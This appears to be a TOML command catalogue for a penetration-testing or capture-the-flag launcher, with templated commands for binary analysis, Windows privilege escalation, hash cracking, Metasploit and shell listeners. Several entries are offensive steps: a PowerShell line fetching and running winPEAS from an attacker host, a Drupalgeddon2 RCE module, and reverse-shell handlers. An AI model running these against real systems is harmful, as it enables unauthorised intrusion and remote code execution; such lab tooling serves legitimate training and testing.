[[command]]
category = "forensics"
name = "foremost carve"
description = "carve files out of a blob/disk image"
template = "foremost -i <FILE> -o foremost_out"
tags = ["forensics", "carve"]

# ── pwn / rev ──
[[command]]
category = "pwn"
name = "checksec"
description = "binary protections (NX/PIE/canary/RELRO)"
template = "checksec --file=<FILE>"
tags = ["pwn", "rev"]

[[command]]
category = "pwn"
name = "pwntools template"
description = "generate an exploit skeleton"
template = "pwn template --host <RHOST> --port <RPORT> <FILE> > exploit.py"
tags = ["pwn", "template"]

[[command]]
category = "pwn"
name = "ltrace"
description = "trace library calls"
template = "ltrace ./<FILE>"
tags = ["pwn", "rev", "trace"]

[[command]]
category = "pwn"
name = "ropper gadgets"
description = "search ROP gadgets"
template = "ropper -f <FILE> --search 'pop rdi'"
tags = ["pwn", "rop"]

# ── windows privesc ──
[[command]]
category = "win"
name = "winpeas pull+run"
description = "fetch and run winPEASx64 (victim PowerShell)"
template = "powershell -c \"iwr http://<LHOST>:<LPORT>/winPEASx64.exe -OutFile $env:TEMP\\wp.exe; & $env:TEMP\\wp.exe\""
tags = ["privesc", "windows", "winpeas"]

[[command]]
category = "win"
name = "whoami /priv"
description = "token privileges (SeImpersonate etc)"
template = "whoami /priv"
tags = ["privesc", "windows"]

[[command]]
category = "win"
name = "systeminfo"
description = "OS/patch level for exploit matching"
template = "systeminfo"
tags = ["privesc", "windows"]

[[command]]
category = "win"
name = "find flags (win)"
description = "search user/root flags"
template = "powershell -c \"Get-ChildItem -Path C:\\Users -Recurse -Include user.txt,root.txt -ErrorAction SilentlyContinue\""
tags = ["windows", "flags"]

# ── crack additions ──
[[command]]
category = "crack"
name = "hashid"
description = "identify a hash type"
template = "hashid '<HASH>'"
tags = ["crack", "identify"]

[[command]]
category = "crack"
name = "zip2john"
description = "extract hash from an encrypted zip"
template = "zip2john <FILE> > zip.hash"
tags = ["crack", "john", "zip"]

# ── misc / gtfobins ──
[[command]]
category = "misc"
name = "gtfobins hint"
description = "reminder — check GTFOBins for a sudo/SUID binary"
template = "echo 'https://gtfobins.github.io/#<FILE>'"
tags = ["privesc", "gtfobins", "reference"]

# ───────────────────────── metasploit ─────────────────────────
[[command]]
category = "msf"
name = "msfconsole"
description = "launch metasploit — press i in the run pane to interact"
template = "msfconsole -q"
tags = ["msf", "exploit"]

[[command]]
category = "msf"
name = "run module"
description = "use a module, set RHOST/LHOST, fire it (non-interactive)"
template = "msfconsole -q -x 'use <MODULE>; set RHOSTS <RHOST>; set LHOST <LHOST>; run; exit -y'"
tags = ["msf", "exploit"]

[[command]]
category = "msf"
name = "multi/handler"
description = "catch a meterpreter/shell payload"
template = "msfconsole -q -x 'use exploit/multi/handler; set payload <PAYLOAD>; set LHOST <LHOST>; set LPORT <LPORT>; run'"
tags = ["msf", "listener", "handler"]

[[command]]
category = "msf"
name = "search"
description = "search modules by term"
template = "msfconsole -q -x 'search <DATA>; exit -y'"
tags = ["msf"]

[[command]]
category = "msf"
name = "drupalgeddon2"
description = "Drupal 7 <7.58 unauthenticated RCE"
template = "msfconsole -q -x 'use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS <RHOST>; set LHOST <LHOST>; run'"
tags = ["msf", "web", "drupal", "rce"]

# ───────────────────────── auto-upgrading shell handlers ─────────────────────────
[[command]]
category = "shells"
name = "pwncat listener"
description = "catch + auto-upgrade to full PTY (tab-complete, up/download)"
template = "pwncat-cs -lp <LPORT>"
tags = ["shell", "listener", "pwncat", "upgrade"]

[[command]]
category = "shells"
name = "pwncat connect"
description = "connect to a bind shell and stabilize it"
template = "pwncat-cs <RHOST>:<RPORT>"
tags = ["shell", "pwncat", "bind"]

[[command]]
category = "shells"
name = "penelope listener"
description = "catch + auto-upgrade; session menu, up/download, logging"
template = "penelope <LPORT>"
tags = ["shell", "listener", "penelope", "upgrade"]
